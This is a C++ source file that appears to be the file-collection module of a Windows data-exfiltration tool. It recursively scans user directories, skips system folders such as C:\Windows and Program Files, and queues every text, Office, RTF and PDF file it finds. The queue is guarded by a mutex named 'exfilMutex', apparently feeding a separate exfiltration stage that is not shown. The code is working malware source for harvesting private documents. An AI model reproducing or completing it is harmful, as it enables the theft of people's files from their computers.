#include "gatherer.h"
#include "globals.h"
#include <iostream>
#include <windows.h>
#include <filesystem>
#include <algorithm>
#include <string>
#include <mutex>
#include <condition_variable>

// External variables
extern std::queue<std::string> fileQueue;
extern std::mutex exfilMutex;
extern std::condition_variable cv;
extern bool doneGathering;

// List of directories to exclude
static std::vector<std::string> excludedDirs = {
    R"(C:\Windows)",
    R"(C:\Program Files)",
    R"(C:\Program Files (x86))",
    R"(C:\ProgramData)",
    R"(C:\Users\Default)"
};

// Check if a path should be excluded
bool Gatherer::isExcluded(const std::string& path) {
    for (const auto& excluded : excludedDirs) {
        if (path.find(excluded) == 0) { // Check if path starts with excluded directory
            return true;
        }
    }
    return false;
}

void customDirectoryTraversal(const std::string& root, const std::vector<std::string>& extensions, std::queue<std::string>& fileQueue) {
    std::wstring searchPath = std::filesystem::path(root).wstring() + L"\\*";
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        std::cerr << "[ERROR] Cannot access directory: " << root << "\n";
        return;
    }

    do {
        std::wstring wFileOrDir = std::filesystem::path(root).wstring() + L"\\" + findData.cFileName;
        std::string fileOrDir = std::filesystem::path(wFileOrDir).string();

        // Skip "." and ".."
        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) {
            continue;
        }

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (!Gatherer::isExcluded(fileOrDir)) {
                customDirectoryTraversal(fileOrDir, extensions, fileQueue);
            } else {
                std::cout << "[INFO] Skipping excluded directory: " << fileOrDir << "\n";
            }
        } else {
            std::string extension = fileOrDir.substr(fileOrDir.find_last_of('.'));
            std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);

            if (std::find(extensions.begin(), extensions.end(), extension) != extensions.end()) {
                std::cout << "[INFO] Found file: " << fileOrDir << "\n";

                {
                    std::lock_guard<std::mutex> lock(exfilMutex);
                    fileQueue.push(fileOrDir);
                }
                cv.notify_one();
            }
        }
    } while (FindNextFileW(hFind, &findData) != 0);

    FindClose(hFind);
}

// Specialized functions
void Gatherer::gatherTextFiles(const std::string& directoryPath) {
    std::vector<std::string> textExtensions = {".txt", ".csv", ".log"};
    customDirectoryTraversal(directoryPath, textExtensions, fileQueue);
}

void Gatherer::gatherDocumentFiles(const std::string& directoryPath) {
    std::vector<std::string> docExtensions = {".doc", ".docx", ".rtf"};
    customDirectoryTraversal(directoryPath, docExtensions, fileQueue);
}

void Gatherer::gatherPdfFiles(const std::string& directoryPath) {
    std::vector<std::string> pdfExtensions = {".pdf"};
    customDirectoryTraversal(directoryPath, pdfExtensions, fileQueue);
}